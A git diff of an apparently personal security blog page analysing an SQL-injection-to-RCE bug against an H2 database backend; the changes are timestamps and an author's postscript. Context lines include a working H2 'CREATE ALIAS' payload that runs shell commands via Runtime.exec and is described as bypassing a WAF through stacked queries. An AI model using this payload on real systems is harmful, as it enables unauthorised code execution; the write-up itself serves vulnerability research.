@@ -33,7 +33,7 @@
 <meta property="og:image" content="http://x-f1v3.github.io/images/1618536657378.png">
 <meta property="og:image" content="http://x-f1v3.github.io/images/1618536680731.png">
 <meta property="og:image" content="http://x-f1v3.github.io/images/1618536689059.png">
-<meta property="og:updated_time" content="2021-04-16T01:34:14.253Z">
+<meta property="og:updated_time" content="2021-04-16T01:48:13.272Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="某mobile RCE分析">
 <meta name="twitter:description" content="原本是个SQL注入,因为后端是H2数据库，所以最后能够通过执行代码达到RCE的效果。">
@@ -217,7 +217,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-04-16 09:29:37 / Modified: 09:34:14" itemprop="dateCreated datePublished" datetime="2021-04-16T09:29:37+08:00">2021-04-16</time>
+              <time title="Created: 2021-04-16 09:29:37 / Modified: 09:48:13" itemprop="dateCreated datePublished" datetime="2021-04-16T09:29:37+08:00">2021-04-16</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -242,7 +242,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>1.1k</span>
+              <span>1.2k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
@@ -271,6 +271,7 @@
 <p>当然也可以使用 <code>CONCAT</code> 这样的内置函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS CONCAT(&apos;void e(String cmd) throws java.io.IOException&apos;,</span><br><span class="line">HEXTORAW(&apos;007b&apos;),&apos;java.lang.Runtime rt= java.lang.Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);&apos;,HEXTORAW(&apos;007d&apos;));</span><br><span class="line">CALL EXEC(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure></p>
 <p>用字符串类型的语句就可以很轻松的绕过 waf,效果更好。</p>
 <p>最终的 payload 不用多说，因为 H2 支持堆叠，所以在注入点后面加上即可。</p>
+<p>ps：很早就发现了注入，但是想的是获取账户权限，结果本身代码中有各种防注入过滤，没有成功，所以以为是个鸡肋的洞，结果可以通过H2数据库执行代码，还是太菜了…</p>
 
     </div>
 
